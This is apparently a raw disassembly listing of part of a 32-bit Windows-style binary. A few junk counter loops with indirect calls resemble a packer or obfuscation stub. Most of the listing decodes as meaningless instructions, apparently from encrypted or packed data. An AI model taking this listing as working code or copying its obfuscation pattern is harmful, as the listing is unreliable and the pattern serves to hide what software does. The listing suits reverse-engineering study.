  41413d:	test   eax,edi
  41413f:	adc    BYTE PTR [ecx+eiz*2],0x66
  414143:	mov    ecx,0x4eeccddf
  414148:	bound  edx,QWORD PTR [edi]
  41414a:	pusha  
  41414b:	mov    bl,0xed
  41414d:	jecxz  0x41410e
  41414f:	inc    ebx
  414150:	das    
  414151:	jecxz  0x41415d
  414153:	mov    cl,0x63
  414155:	repnz cmp bl,ch
  414158:	pop    edx
  414159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41415a:	and    ch,ah
  41415c:	pop    edx
  41415d:	jae    0x4140ea
  41415f:	inc    ebp
  414160:	in     al,dx
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142aa
  414283:	cmp    ah,BYTE PTR [eax]
  414285:	arpl   WORD PTR [eax-0x468f8f8d],ax
  41428b:	jle    0x4142fd
  41428d:	jo     0x4142a4
  41428f:	sub    esi,DWORD PTR fs:[edx+ebp*1]
  414293:	sub    BYTE PTR [ecx+0x5],0x10
  414297:	dec    ebx
  414298:	fidivr DWORD PTR [edi]
  41429a:	vmptrld QWORD PTR [ecx-0x668ee2e8]
  4142a1:	popa   
  4142a2:	or     esp,DWORD PTR [esi]
  4142a4:	pop    eax
  4142a5:	xor    al,0xd8
  4142a7:	fidiv  DWORD PTR [ebp+0x71]
  4142aa:	(bad)  
  4142ab:	jp     0x4142b4
  4142ad:	sbb    BYTE PTR [bx+si+0x5f85],dl
  4142b2:	repnz dec ecx
  4142b4:	sahf   
  4142b5:	pushf  
  4142b6:	xchg   ebx,eax
  4142b7:	cwde   
  4142b8:	lds    edi,FWORD PTR [esi]
  4142ba:	fcom   QWORD PTR [ebx]
  4142bc:	int    0x85
  4142be:	mov    dh,0x9b
  4142c0:	cwde   
  4142c1:	mov    DWORD PTR [edx+esi*1+0x10302723],0x5eee9577
  4142cc:	fdiv   DWORD PTR [esi]
  4142ce:	call   0xfc6f:0x57bac1a3
  4142d5:	or     al,0x6f
  4142d8:	jle    0x414287
  4142da:	imul   esp,ebx,0x481a5b6e
  4142e0:	cs xor al,0xd8
  4142e3:	jecxz  0x4142bc
  4142e5:	fistp  QWORD PTR [ecx]
  4142e7:	xor    eax,DWORD PTR [ebx-0x15b2d590]
  4142ed:	sub    esi,DWORD PTR gs:[ecx]
  4142f0:	adc    ebp,ecx
  4142f2:	add    BYTE PTR [ebx-0x773a3192],dl
  4142f8:	mov    ds:0x8cad7b7f,al
  4142fd:	jp     0x41428b
  4142ff:	aaa    
  414300:	out    dx,al
  414301:	outs   dx,BYTE PTR ds:[esi]
  414302:	into   
  414303:	fcom   DWORD PTR [ebx+0x7b9bde79]
  414309:	push   cs
  41430a:	cmc    
  41430b:	ror    BYTE PTR ds:0x7d110bc4,1
  414311:	lods   eax,DWORD PTR ds:[esi]
  414312:	inc    ecx
  414313:	xor    BYTE PTR [eax],0x22
  414316:	aas    
  414317:	xor    al,0x2f
  414319:	adc    BYTE PTR [ecx+eax*4-0x22],bl
  41431d:	in     eax,0xe5
  41431f:	push   ds
  414320:	out    0x5b,al
  414322:	xor    DWORD PTR ds:0xdfe61a57,ebx
  414328:	rol    edi,0x57
  41432b:	stos   DWORD PTR es:[edi],eax
  41432c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432d:	cwde   
  41432e:	sbb    BYTE PTR [edi+0x32],bh
  414331:	fnstsw WORD PTR [eax]
  414333:	popa   
  414334:	jmp    0x6b87:0xc613ff3e
  41433b:	retf   
  41433c:	push   esi
  41433d:	sbb    al,BYTE PTR [edx]
  41433f:	and    edx,0x71a7bf74
  414345:	mov    cs,edx
  414347:	sub    DWORD PTR [edx],ecx
  414349:	int3   
  41434a:	sar    ah,cl
  41434c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41434d:	fsubr  DWORD PTR [ebx-0x6f28f467]
  414353:	push   es
  414354:	mov    ch,0xc1
  414356:	out    0x16,al
  414358:	jbe    0x41438e
  41435a:	repz ficomp WORD PTR [edx-0x1b]
  41435e:	int3   
  41435f:	xor    al,0xb1
  414361:	aad    0x24
  414363:	add    ah,BYTE PTR [edi+0x32]
  414366:	mov    al,0xe7
  414369:	add    eax,esp
  41436b:	sub    eax,DWORD PTR [eax]
  41436d:	pop    esi
  41436e:	xchg   DWORD PTR ds:0x62f05e17,esp
  414374:	rcr    DWORD PTR [ebx],0xcc
  414377:	and    eax,0xc0a141e2
  41437c:	xchg   ebp,eax
  41437d:	push   ebp
  41437e:	outs   dx,DWORD PTR ds:[esi]
  41437f:	push   edi
  414380:	sub    al,0x85
  414382:	retf   
  414383:	iret   
  414384:	ds es inc ebx
  414387:	add    eax,0xc3bca90a
  41438c:	mov    ds:0xbcb6d239,eax
  414392:	add    DWORD PTR [ecx-0x1c],edi
  414395:	push   esp
  414396:	mov    BYTE PTR [edi],ch
  414398:	push   eax
  414399:	xchg   DWORD PTR [eax],ebp
  41439b:	jne    0x4143a1
  41439d:	adc    al,ch
  41439f:	(bad)  
  4143a0:	mov    ss,edi
  4143a2:	mov    DWORD PTR [edx-0x58265a48],0x494315fe
  4143ac:	jg     0x414364
  4143ae:	xchg   BYTE PTR [ecx+0x54],bl
  4143b1:	mov    bl,0xf8
  4143b3:	in     al,0xd8
  4143b5:	add    eax,ebx
  4143b7:	sbb    esp,DWORD PTR [eax+0x3502abbb]
  4143bd:	push   0xd68f8da1
  4143c2:	int    0xd3
  4143c4:	mov    edi,0x9f939328
  4143c9:	in     eax,0x2d
  4143cb:	jmp    0x41434e
  4143cd:	cmpps  xmm6,XMMWORD PTR [ebp+0x1707137a],0x2e
  4143d5:	out    dx,eax
  4143d6:	test   DWORD PTR [ebx+edx*4+0x64],ebx
  4143da:	sub    eax,0xb9b26734
  4143df:	inc    ecx
  4143e0:	mov    ch,0xd0
  4143e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143e3:	bound  esi,QWORD PTR [esi-0x25]
  4143e6:	mov    edi,0xccfb9d61
  4143eb:	ret    
  4143ec:	js     0x4143d0
  4143ee:	hlt    
  4143ef:	sub    eax,0x8cc2d698
  4143f4:	(bad)  
  4143f5:	loopne 0x41438e
  4143f7:	lds    edx,FWORD PTR [eax-0x3]
  4143fa:	mov    esp,0xcdcbc8b3
  4143ff:	jmp    0x4143bf
  414401:	test   edx,edi
  414403:	sar    DWORD PTR [esi+0x2c7578d4],1
  414409:	cmp    dl,BYTE PTR [edi-0x9]
  41440c:	pop    esp
  41440d:	push   0x50e68827
  414412:	enter  0x2a74,0xd4
  414416:	push   ss
  414417:	(bad)  
  414418:	lock inc esi
  41441a:	(bad)  
  41441c:	cdq    
  41441d:	enter  0xd92a,0xa3
  414421:	jge    0x414405
  414423:	(bad)
  414426:	cwde   
  414427:	xor    al,0x9d
  414429:	(bad)  
  41442a:	out    0xbf,eax
  41442c:	fimul  WORD PTR [edi-0x5d177c4e]
  414432:	jnp    0x41446f
  414434:	aas    
  414435:	xchg   BYTE PTR ds:0xb2dbb46b,ch
  41443b:	ins    DWORD PTR es:[edi],dx
  41443c:	pop    esi
  41443d:	pop    ebx
  41443e:	ds in  eax,dx
  414440:	bound  edi,QWORD PTR [edx-0x4]
  414443:	js     0x4144bd
  414445:	(bad)  
  414446:	jmp    0x4143d4
  414448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414449:	icebp  
  41444a:	(bad)  
  41444b:	stos   BYTE PTR es:[edi],al
  41444c:	fsubr  DWORD PTR [edx]
  41444e:	mov    ch,0xe6
  414450:	mov    eax,0x19dc3fc2
  414455:	es push esi
  414457:	inc    ebp
  414458:	mov    al,0x3e
  41445a:	jle    0x41447a
  41445c:	sbb    al,0x94
  41445e:	into   
  41445f:	mov    edx,0xf0b3cb4a
  414464:	jmp    0x4144b3
  414466:	xor    eax,edi
  414468:	fsubr  QWORD PTR [ebp-0x73]
  41446b:	dec    eax
  41446c:	mov    WORD PTR [edi+0x157a2424],?
  414472:	and    ecx,eax
  414474:	(bad)  
  414475:	mov    bl,0xf0
  414477:	cmc    
  414478:	sbb    BYTE PTR [esp+eiz*8+0x60],ch
  41447c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447d:	fdiv   QWORD PTR [edi-0x34]
  414480:	inc    ebp
  414481:	pop    edx
  414482:	push   0x56d94365
  414487:	mov    dh,0x9d
  414489:	jmp    0x4144db
  41448b:	bound  ecx,QWORD PTR [esi+0xf24d2c8]
  414491:	xor    ebx,DWORD PTR [ebx]
  414493:	sub    DWORD PTR [edi+eax*4-0x1a],0x79
  414498:	test   DWORD PTR [ebp+0x6],0x7ad24c35
  41449f:	mov    ecx,0x855a6745
  4144a4:	mov    ds:0x8f8a3817,eax
  4144a9:	inc    eax
  4144aa:	rcl    DWORD PTR [ecx+0x1e996054],cl
  4144b0:	mov    bh,0xf3
  4144b2:	ror    BYTE PTR [edx+ebp*1-0x2ca08a5e],0xc2
  4144ba:	int3   
  4144bb:	ja     0x41447b
  4144bd:	mov    BYTE PTR [esi],al
  4144bf:	(bad)  [ebx+0x58]
  4144c2:	out    0x3a,eax
  4144c4:	ds inc esp
  4144c6:	(bad)  
  4144c7:	in     al,dx
  4144c8:	xchg   ecx,eax
  4144c9:	nop
  4144ca:	mov    esp,0x516f56cb
  4144cf:	sti    
  4144d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d1:	in     al,0x22
  4144d3:	fisubr DWORD PTR [eax-0x41]
  4144d6:	loop   0x41452b
  4144d8:	adc    BYTE PTR [edx-0x3098d731],0xc1
  4144df:	xchg   edx,eax
  4144e0:	out    0x1f,eax
  4144e2:	pop    ds
  4144e3:	iret   
  4144e4:	fidivr WORD PTR [esi-0x46895c28]
  4144ea:	int3   
  4144eb:	mov    eax,0x175a0cb5
  4144f0:	adc    bh,BYTE PTR [ebx-0x4deaaeed]
  4144f6:	xchg   ecx,eax
  4144f7:	inc    ecx
  4144f8:	push   eax
  4144f9:	ret    
  4144fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144fb:	dec    edi
  4144fc:	adc    edi,DWORD PTR [eax+0x2e713593]
  414502:	add    DWORD PTR [edx-0x656e4950],edx
  414508:	adc    al,0xb7
  41450a:	loop   0x414514
  41450c:	pop    ds
  41450d:	fs scas al,BYTE PTR es:[edi]
  41450f:	addr16 (bad) 
  414511:	mov    ch,0x8b
  414513:	shr    DWORD PTR [ecx+0x7b],0xb2
  414517:	mov    DWORD PTR [edx+ecx*8+0xc],ebx
  41451b:	xchg   edx,eax
  41451d:	push   es
  41451e:	xchg   esp,eax
  41451f:	outs   dx,BYTE PTR ds:[esi]
  414520:	out    dx,al
  414521:	sti    
  414522:	pop    edx
  414523:	dec    esi
  414524:	mov    al,ds:0xc3fc0bdb
  414529:	add    DWORD PTR [ebx+0x52096d0b],0x56982a92
  414533:	nop
  414534:	imul   esp,DWORD PTR [ebp+0x395bde68],0x6d
  41453b:	jl     0x4145a3
  41453d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41453f:	and    eax,0x881bf429
  414544:	xor    al,0x3a
  414546:	leave  
  414547:	cmp    al,0xcc
  414549:	pop    ds
  41454a:	mov    bl,0x59
  41454c:	add    esi,DWORD PTR [eax-0x10]
  41454f:	lods   al,BYTE PTR ds:[esi]
  414550:	sub    al,0x27
  414552:	xor    al,0x5
  414554:	mov    ds:0xffd075ff,al
  414559:	jne    0x414567
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x3931beb4
  414576:	jmp    0xb970:0x7f70c9e4
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145c0
  414581:	add    edx,DWORD PTR [esi+0x75a8b1cd]
  414587:	push   esp
  414588:	xchg   esi,eax
  414589:	push   edi
  41458a:	scas   al,BYTE PTR es:[edi]
  41458b:	adc    al,0xf8
  41458d:	push   ss
  41458e:	mov    al,0x50
  414590:	out    0xce,eax
  414592:	push   esi
  414593:	sbb    DWORD PTR [edx-0x6d758692],ecx
  414599:	int    0xa1
  41459b:	mov    eax,ds:0x702dde21
  4145a0:	scas   al,BYTE PTR es:[edi]
  4145a1:	mov    dh,dl
  4145a3:	fld    QWORD PTR [edi*2+0x2b6ef1ac]
  4145aa:	test   eax,0x65f01a0e
  4145af:	adc    DWORD PTR [edx-0x22047fa1],ebx
  4145b5:	dec    eax
  4145b6:	into   
  4145b7:	aad    0x36
  4145b9:	xchg   ecx,eax
  4145ba:	retf   0x304b
  4145bd:	mov    WORD PTR [edi+ecx*1-0x3d],gs
  4145c1:	fs lahf 
  4145c3:	and    dl,BYTE PTR ss:[ecx-0x66]
  4145c7:	mov    gs,WORD PTR [esi-0x471105ed]
  4145cd:	xchg   esi,eax
  4145ce:	mov    WORD PTR [ecx+0x72],cs
  4145d1:	fistp  DWORD PTR [edx]
  4145d3:	(bad)  
  4145d4:	(bad)  
  4145d5:	fwait
  4145d6:	test   eax,0x52f04514
  4145db:	jg     0x41459b
  4145dd:	mov    dl,0xc7
  4145df:	pop    ecx
  4145e0:	add    al,0x87
  4145e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e3:	push   ebx
  4145e4:	(bad)  
  4145e5:	lea    esi,ds:0x718e525b
  4145eb:	push   esp
  4145ec:	fimul  WORD PTR [esi]
  4145ee:	mov    DWORD PTR [ecx],0xd83767da
  4145f4:	(bad)  
  4145f5:	fldcw  WORD PTR [edi+0xebc2908]
  4145fb:	(bad)  [edx+0x75f675ce]
  414601:	stos   BYTE PTR es:[edi],al
  414602:	arpl   WORD PTR [eax+0x11a40ec3],ax
  414608:	(bad)  
  414609:	js     0x4145c3
  41460b:	out    0x9b,al
  41460d:	cli    
  41460e:	scas   eax,DWORD PTR es:[edi]
  41460f:	enter  0x9974,0x1
  414613:	outs   dx,BYTE PTR ds:[esi]
  414614:	loop   0x41468a
  414616:	fdivr  DWORD PTR [esi+0x3ada3456]
  41461c:	int    0x9a
  41461e:	jns    0x4145d9
  414620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414621:	in     al,dx
  414622:	mov    eax,0x9165b90d
  414627:	(bad)  
  414628:	jmp    0x83ad:0xeddfddbb
  41462f:	jnp    0x4145ff
  414631:	xchg   edx,eax
  414632:	ret    
  414633:	aas    
  414634:	and    al,0xad
  414636:	jecxz  0x4145e4
  414638:	inc    esp
  414639:	inc    edx
  41463a:	xchg   BYTE PTR [edx+0x1d14fb35],dl
  414640:	pop    ebp
  414641:	retf   
  414642:	ja     0x414666
  414644:	mov    ch,0x32
  414646:	(bad)
  414649:	push   esi
  41464a:	jl     0x41460c
  41464c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41464d:	jmp    0x4145de
  41464f:	xor    edi,DWORD PTR ds:0xa4b6ccc6
  414655:	and    eax,0xf895880c
  41465a:	shl    DWORD PTR [esi],0x4c
  41465d:	mov    ah,0x8c
  41465f:	mov    ch,0x41
  414661:	cmp    ebx,DWORD PTR [eax]
  414663:	aaa    
  414664:	pusha  
  414665:	xor    al,0x4e
  414667:	dec    eax
  414668:	inc    edx
  414669:	pusha  
  41466a:	push   eax
  41466b:	call   0x33f864c0
  414670:	jmp    0xad61:0xa5c2158c
  414677:	out    0xc4,eax
  414679:	aad    0x39
  41467b:	(bad)
  414680:	jp     0x414688
  414682:	xchg   ebx,eax
  414683:	push   ecx
  414684:	(bad)  
  414685:	lods   eax,DWORD PTR ds:[esi]
  414686:	ins    BYTE PTR es:[edi],dx
  414687:	adc    al,0x67
  414689:	cld    
  41468a:	ret    0xaaf6
  41468d:	xchg   DWORD PTR [edi-0x46],edi
  414690:	pop    ss
  414691:	into   
  414692:	fwait
  414693:	popf   
  414694:	ds pop ecx
  414696:	xchg   DWORD PTR [esi-0x247b0409],esi
  41469c:	sub    DWORD PTR [ecx],esp
  41469e:	jmp    FWORD PTR [esi+0x6b862cae]
  4146a4:	lock sbb DWORD PTR [edi-0x11],esi
  4146a8:	shl    ebx,1
  4146aa:	or     al,0xa5
  4146ac:	add    eax,0x982f3217
  4146b1:	xchg   esp,eax
  4146b2:	out    0x34,al
  4146b4:	xchg   esi,eax
  4146b5:	cmp    DWORD PTR [esi+0x45],esp
  4146b8:	mov    esp,0x9ace11bc
  4146bd:	(bad)
  4146c0:	imul   ecx,DWORD PTR [eax-0x6893be8e],0xeef4a80
  4146ca:	cmp    DWORD PTR [edx],eax
  4146cc:	mov    BYTE PTR [esi],ah
  4146ce:	sbb    DWORD PTR [ecx],ebx
  4146d0:	(bad)  
  4146d1:	shl    BYTE PTR [edi+0x2c],cl
  4146d4:	ret    0x826f
  4146d7:	pushf  
  4146d8:	sub    cl,bh
  4146da:	sub    DWORD PTR [edi+0x55],esp
  4146dd:	mov    esi,0x71686fcb
  4146e2:	scas   al,BYTE PTR es:[edi]
  4146e3:	add    al,0x2a
  4146e5:	and    eax,0x488103f0
  4146ea:	popa   
  4146eb:	add    al,0x7e
  4146ed:	inc    ecx
  4146ee:	dec    ebx
  4146ef:	push   eax
  4146f0:	ret    0xf2ab
  4146f3:	add    BYTE PTR [ebx-0x51],cl
  4146f6:	inc    edi
  4146f7:	xchg   ebx,eax
  4146f8:	in     eax,0x23
  4146fa:	sub    eax,0x9f5d40a0
  4146ff:	scas   eax,DWORD PTR es:[edi]
  414700:	xchg   edi,eax
  414701:	inc    edi
  414702:	adc    DWORD PTR [esi+0x4a],0x5e
  414706:	cli    
  414707:	les    ebx,FWORD PTR [edi+ebp*4]
  41470a:	gs xchg esp,eax
  41470c:	fwait
  41470d:	gs jb  0x41476d
  414710:	ror    DWORD PTR [ebx],0x32
  414713:	imul   esi,DWORD PTR [edi+edx*2],0x20
  414717:	jmp    0xe076:0xda50c58a
  41471e:	clc    
  41471f:	jbe    0x4146a6
  414721:	retf   0x2818
  414724:	mov    dl,bh
  414726:	cli    
  414727:	test   BYTE PTR [eax+0x1a],ch
  41472a:	in     eax,0x6d
  41472c:	loope  0x4147a8
  41472e:	cmp    eax,0x58f58c3a
  414733:	adc    edx,ebp
  414735:	fwait
  414736:	mov    edx,DWORD PTR [edx+0x184a4c61]
  41473c:	pop    esi
  41473d:	cmp    ebx,DWORD PTR [ebx+0x66b0ab0]
  414743:	(bad)  
  414745:	dec    edx
  414746:	pop    ds
  414747:	es call 0x543a34d6
  41474d:	pop    edx
  41474e:	outs   dx,BYTE PTR ds:[esi]
  41474f:	je     0x414722
  414751:	or     BYTE PTR [ecx-0x18],0x11
  414755:	xor    dl,ah
  414757:	jmp    0xa136:0x15c6f570
  41475e:	loopne 0x414784
  414760:	int3   
  414761:	jb     0x41475b
  414763:	push   esi
  414764:	stos   DWORD PTR es:[edi],eax
  414765:	fs and dh,al
  414768:	jge    0x4147cc
  41476a:	push   ebp
  41476b:	leave  
  41476c:	push   cs
  41476d:	jb     0x414742
  41476f:	fcom   DWORD PTR [eax+eiz*8]
  414772:	and    ecx,ebp
  414774:	sti    
  414775:	ror    esi,0x2f
  414778:	fidiv  DWORD PTR ds:0xb52752b4
  41477e:	rol    DWORD PTR [esi],cl
  414780:	imul   ebp,DWORD PTR [edi],0x73
  414783:	add    edi,DWORD PTR [ebx]
  414785:	pop    ds
  414786:	das    
  414787:	xor    BYTE PTR [ebp-0x37],bh
  41478a:	pop    es
  41478b:	and    DWORD PTR [ebp-0x1e51c09c],ebx
  414791:	sub    edx,DWORD PTR [edi]
  414793:	sbb    DWORD PTR [edx-0x42],eax
  414796:	les    ecx,FWORD PTR [edi]
  414798:	pop    ecx
  414799:	xor    BYTE PTR [ebx-0x8],0xe8
  41479d:	mov    al,0x8a
  41479f:	mov    gs,WORD PTR [ecx+0x7b836304]
  4147a5:	js     0x41476b
  4147a7:	inc    ecx
  4147a8:	jle    0x41472e
  4147aa:	pop    ebp
  4147ab:	cmp    bh,ah
  4147ad:	cdq    
  4147ae:	mov    ebx,DWORD PTR [ecx+ebp*4-0x61]
  4147b2:	addr16 pop esi
  4147b4:	mov    ds:0x40e3ac43,eax
  4147b9:	js     0x41477e
  4147bb:	imul   edi,DWORD PTR [esp+eax*1],0xf643e750
  4147c2:	inc    edi
  4147c3:	sub    dh,dh
  4147c5:	call   0xb120:0x30b40fac
  4147cc:	enter  0xb589,0x64
  4147d0:	inc    esi
  4147d1:	xchg   ecx,eax
  4147d2:	cmp    bh,bh
  4147d4:	inc    ecx
  4147d5:	cmp    dl,BYTE PTR [edx+0x6704da0a]
  4147db:	pop    ss
  4147dc:	push   edx
  4147dd:	jp     0x4147a1
  4147df:	enter  0x42fc,0x10
  4147e3:	mov    al,dl
  4147e5:	clc    
  4147e6:	fstp   TBYTE PTR [eax]
  4147e8:	push   ebp
  4147e9:	adc    al,0xb5
  4147eb:	xchg   esi,eax
  4147ec:	push   eax
  4147ed:	add    al,0xda
  4147ef:	pop    ecx
  4147f0:	bound  edi,QWORD PTR [eax]
  4147f2:	mov    ds:0x3a1a0ece,al
  4147f7:	mov    eax,0xe7193e1e
  4147fc:	in     al,dx
  4147fd:	loopne 0x4147ce
  4147ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414800:	mov    al,0xa
  414802:	(bad)  
  414803:	jb     0x414883
  414805:	es cmc 
  414807:	loope  0x414888
  414809:	test   eax,0xae45dac0
  41480e:	jns    0x41483f
  414810:	dec    eax
  414811:	scas   al,BYTE PTR es:[edi]
  414812:	xchg   ebp,eax
  414813:	xchg   ebp,eax
  414814:	inc    esi
  414815:	cmp    eax,ebp
  414817:	adc    DWORD PTR [edx+0x2],edx
  41481a:	cmp    BYTE PTR [edx],ah
  41481c:	cmp    BYTE PTR [eax+ecx*4+0x220b9184],ah
  414823:	sub    al,0xe8
  414825:	mov    ebx,0xeebd7fe7
  41482a:	jl     0x41484f
  41482c:	adc    bl,0x26
  41482f:	into   
  414830:	mov    ah,0xb3
  414832:	xchg   esp,eax
  414833:	mov    ds:0x3fcdee67,al
  414838:	js     0x4148a9
  41483a:	enter  0xcca5,0xc0
  41483e:	push   cs
  41483f:	pushf  
  414840:	(bad)  
  414841:	dec    esi
  414842:	(bad)  
  414843:	mov    bh,0xe8
  414845:	push   ebp
  414846:	retf   
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414807
  414861:	lds    esi,FWORD PTR [ecx+0x7f7d12bc]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x414805
  41486d:	push   esi
  41486e:	sbb    al,0xb
  414870:	xor    dl,dl
  414872:	bound  ecx,QWORD PTR [edi-0x761ed445]
  414878:	repz and DWORD PTR [eax-0x2d],0xf1b9fab
  414880:	push   0xffffffe5
  414882:	push   edi
  414883:	repz fbstp TBYTE PTR [esi+edx*4+0x6aa18956]
  41488b:	ja     0x414891
  41488d:	pop    ecx
  41488e:	mov    dh,0xbf
  414890:	sbb    al,0xdc
  414892:	int3   
  414893:	sbb    ch,BYTE PTR [esp+ebp*8+0x5a]
  414897:	mov    BYTE PTR [esi+0x48bbc55d],al
  41489d:	retf   0x8ec9
  4148a0:	int    0x73
  4148a2:	jnp    0x41486b
  4148a4:	fidivr DWORD PTR [eax-0x3123521d]
  4148aa:	dec    esi
  4148ab:	cmp    DWORD PTR [ebx],edx
  4148ad:	push   cs
  4148ae:	mov    ebp,0x7869e63b
  4148b3:	repz mov bh,0xbc
  4148b6:	dec    ecx
  4148b7:	dec    edi
  4148b8:	call   0x575c0d23
  4148bd:	mov    edx,0xdada442f
  4148c2:	les    ebp,FWORD PTR [esp+edx*2-0x2d]
  4148c6:	mov    DWORD PTR [ebx-0x35],0x88c0a4a9
  4148cd:	addr16 cwde 
  4148cf:	pop    edx
  4148d0:	ds inc esp
  4148d2:	fcomp  QWORD PTR [ecx]
  4148d4:	pop    ds
  4148d5:	fmul   DWORD PTR [esi]
  4148d7:	xchg   ebp,eax
  4148d8:	aam    0x10
  4148da:	xchg   esi,eax
  4148db:	xchg   ecx,eax
  4148dc:	gs push ebx
  4148de:	clc    
  4148df:	xchg   BYTE PTR [ebp-0x8],bh
  4148e2:	dec    edi
  4148e3:	add    edx,edi
  4148e5:	in     al,dx
  4148e6:	cs iret 
  4148e8:	mov    ch,0x4b
  4148ea:	jne    0x41493c
  4148ec:	mov    esi,DWORD PTR [esi]
  4148ee:	add    bh,BYTE PTR [esi-0x80]
  4148f1:	dec    esp
  4148f2:	and    ebp,DWORD PTR [ebp-0x4b]
  4148f5:	(bad)  
  4148f7:	dec    edi
  4148f8:	(bad)  
  4148f9:	ds out 0x40,al
  4148fc:	pop    edx
  4148fd:	cli    
  4148fe:	lock mov bl,0xe8
  414901:	adc    al,0x91
  414903:	fdivr  QWORD PTR [ecx+edi*2+0x46]
  414907:	out    0xb3,al
  414909:	inc    edi
  41490a:	fcomi  st,st(1)
  41490c:	jle    0x41498b
  41490e:	inc    ebp
  41490f:	les    edi,FWORD PTR [edi+0x43]
  414912:	lods   al,BYTE PTR ds:[esi]
  414913:	in     eax,dx
  414914:	jmp    0x2f051338
  414919:	and    DWORD PTR [edx+0x4],eax
  41491c:	or     edx,DWORD PTR [esi+0x7a]
  41491f:	xor    eax,DWORD PTR [esi]
  414921:	jb     0x41493c
  414923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414924:	push   esi
  414925:	cmp    eax,0xe1def9cb
  41492a:	jecxz  0x414919
  41492c:	sub    al,0x2e
  41492e:	or     ebx,ecx
  414930:	aaa    
  414931:	mov    dl,0x75
  414933:	in     eax,0xa0
  414935:	dec    ecx
  414936:	and    esp,edi
  414938:	dec    edx
  414939:	dec    esp
  41493a:	xor    DWORD PTR [esi],0xffffffac
  41493d:	mov    ecx,0xda730239
  414942:	dec    ecx
  414943:	mov    ah,0xaf
  414945:	mov    ebx,0x971b860c
  41494a:	sbb    eax,0x45cd93ba
  41494f:	pop    esp
  414950:	xchg   BYTE PTR [esi-0x1740835f],ch
  414956:	fwait
  414957:	mov    WORD PTR [eax-0x15],ss
  41495a:	cmc    
  41495b:	loopne 0x4148fb
  41495d:	int    0x21
  41495f:	add    dh,BYTE PTR [esi]
  414961:	iret   
  414962:	adc    BYTE PTR ds:0x4de64e42,cl
  414968:	mov    eax,DWORD PTR [esi]
  41496a:	jmp    0xbbc25ed9
